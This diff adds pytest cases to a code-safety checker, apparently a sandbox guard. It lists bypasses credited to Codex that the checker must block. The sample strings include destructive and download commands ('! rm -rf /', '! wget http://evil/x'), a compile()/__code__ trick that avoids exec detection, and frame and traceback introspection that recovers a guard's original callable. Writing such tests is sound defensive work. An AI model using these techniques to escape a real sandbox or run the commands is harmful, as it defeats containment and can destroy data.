@@ -3393,3 +3393,70 @@ class TestRound30Bypasses:
     )
     def test_round30_benign_allowed(self, code):
         _ok(code)
+
+
+class TestRound31Bypasses:
+    """Thirty-first-round Codex findings: frame / traceback introspection recovering a runtime
+    guard's original callable, an opaque compile() source executable via __code__, and a bash
+    pipeline-negation `!` mistaken for the command word."""
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            # A leading ! negates the pipeline but the next word is still the command that runs.
+            "import os\nos.system('! touch /tmp/escape')",
+            "import os\nos.system('! python3 -c \"import os\"')",
+            "import subprocess\nsubprocess.run('! wget http://evil/x', shell=True)",
+            "import os\nos.system('! rm -rf /')",
+            "import os\nos.system('! bash script.sh')",
+        ],
+    )
+    def test_shell_negation_command_position_blocked(self, code):
+        assert _check_code_safety(code) is not None, code
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            # An opaque compile() source is executable via fn.__code__ = compile(...); fn(),
+            # bypassing exec / eval / types.FunctionType, so it must be blocked like exec.
+            "src = get()\nc = compile(src, '<p>', 'exec')",
+            "def f():\n    pass\nf.__code__ = compile(payload, '<p>', 'exec')\nf()",
+            "c = compile(open('p.py').read(), '<p>', 'exec')",
+        ],
+    )
+    def test_opaque_compile_blocked(self, code):
+        assert _check_code_safety(code) is not None, code
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            # Frame / traceback introspection can read a guard wrapper's original `real` callable
+            # from frame.f_locals after a denied open(); block the acquisition + f_locals read.
+            "import sys\ndef t(fr, e, a):\n    r = fr.f_locals.get('real')\n    return t\nsys.settrace(t)",
+            "try:\n    open('/x', 'w')\nexcept PermissionError as e:\n    r = e.__traceback__.tb_frame.f_locals['real']",
+            "import sys\nr = sys._getframe(1).f_locals",
+            "import inspect\nr = inspect.currentframe().f_back.f_locals",
+            "import sys\nr = getattr(sys._getframe(), 'f_locals')",
+            "import sys\nsys.setprofile(hook)",
+        ],
+    )
+    def test_frame_introspection_blocked(self, code):
+        assert _check_code_safety(code) is not None, code
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            # A literal compile source is analyzed recursively and stays allowed; ! in argument
+            # position (test / find) is not a command; frame-free code and normal exception /
+            # traceback formatting must still pass.
+            "c = compile('1 + 1', '<p>', 'eval')\nprint(eval('1 + 1'))",
+            "c = compile('x = 1\\nprint(x)', '<p>', 'exec')",
+            "import os\nos.system('[ ! -f x.txt ]')",
+            "import os\nos.system(\"find . ! -name '*.py' -print\")",
+            "import numpy as np\nx = np.stack([np.ones(3)])\nprint(x.sum())",
+            "try:\n    x = 1 / 0\nexcept ZeroDivisionError as e:\n    print('caught', e)",
+            "import traceback\ntry:\n    f()\nexcept Exception:\n    traceback.print_exc()",
+        ],
+    )
+    def test_round31_benign_allowed(self, code):
+        _ok(code)
